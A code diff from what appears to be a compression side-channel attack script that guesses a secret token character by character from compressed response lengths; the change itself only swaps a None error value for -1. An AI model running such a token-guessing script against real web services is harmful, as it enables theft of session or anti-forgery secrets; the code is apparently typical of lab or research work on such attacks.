@@ -36,7 +36,7 @@ def get_response_length(url, param_name, guess):
         return compressed_length
     except requests.RequestException as e:
         print(f"Request failed: {e}")
-        return None
+        return -1
 
 
 def guess_token(url, param_name, possible_chars, padding, padding_amount=1):
@@ -50,7 +50,7 @@ def guess_token(url, param_name, possible_chars, padding, padding_amount=1):
                 get_response_length(url, param_name, guessed_token + c + padding*padding_amount + '@'),  # test Hoffman and LZ77
                 get_response_length(url, param_name, guessed_token + padding*padding_amount + c + '@')   # test only Hoffman
             ]
-            if None in response_lengths:
+            if -1 in response_lengths:
                 continue  # Skip to the next character if the request failed
             print(f"Trying '{guessed_token + c}': response lengths = {response_lengths}")
 
